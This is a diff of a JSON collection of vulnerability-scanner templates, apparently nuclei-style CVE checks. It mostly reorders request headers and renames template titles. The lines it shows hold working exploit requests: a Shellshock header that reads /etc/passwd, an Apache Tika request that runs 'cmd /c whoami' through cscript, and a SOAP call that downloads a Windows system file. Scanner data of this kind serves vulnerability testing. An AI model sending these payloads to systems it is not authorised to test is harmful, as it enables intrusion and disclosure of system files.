@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6371,11 +6371,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -11306,9 +11306,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -13523,7 +13523,7 @@
     {
       "id": "CVE-2021-24146",
       "info": {
-        "name": "Modern Events Calendar Lite < 5.16.5 - Unauthenticated Events Export",
+        "name": "WordPress Modern Events Calendar Lite <5.16.5 - Sensitive Information Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -13568,7 +13568,7 @@
     {
       "id": "CVE-2021-24226",
       "info": {
-        "name": "AccessAlly < 3.5.7 - $_SERVER Superglobal Leakage",
+        "name": "AccessAlly <3.5.7 - Sensitive Information Leakage",
         "severity": "high"
       },
       "requests": [
@@ -13672,7 +13672,7 @@
     {
       "id": "CVE-2021-24278",
       "info": {
-        "name": "Redirection for Contact Form 7 < 2.3.4 - Unauthenticated Arbitrary Nonce Generation",
+        "name": "WordPress Contact Form 7 <2.3.4 - Arbitrary Nonce Generation",
         "severity": "high"
       },
       "requests": [
@@ -13810,7 +13810,7 @@
     {
       "id": "CVE-2021-24340",
       "info": {
-        "name": "WordPress Plugin WP Statistics < 13.0.8 - Unauthenticated Time-Based Blind SQL Injection",
+        "name": "WordPress Statistics <13.0.8 - Blind SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -14032,7 +14032,7 @@
     {
       "id": "CVE-2021-24750",
       "info": {
-        "name": "WP Visitor Statistics (Real Time Traffic) WordPress plugin before 4.8 SQLI",
+        "name": "WordPress Visitor Statistics (Real Time Traffic) <4.8 -SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -15068,7 +15068,7 @@
     {
       "id": "CVE-2021-3017",
       "info": {
-        "name": "Intelbras WIN 300/WRN 342 Credential Disclosure",
+        "name": "Intelbras WIN 300/WRN 342 - Credentials Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -18470,7 +18470,7 @@
     {
       "id": "CVE-2022-26148",
       "info": {
-        "name": "Grafana & Zabbix Integration - Credential Disclosure",
+        "name": "Grafana & Zabbix Integration - Credentials Disclosure",
         "severity": "critical"
       },
       "requests": [
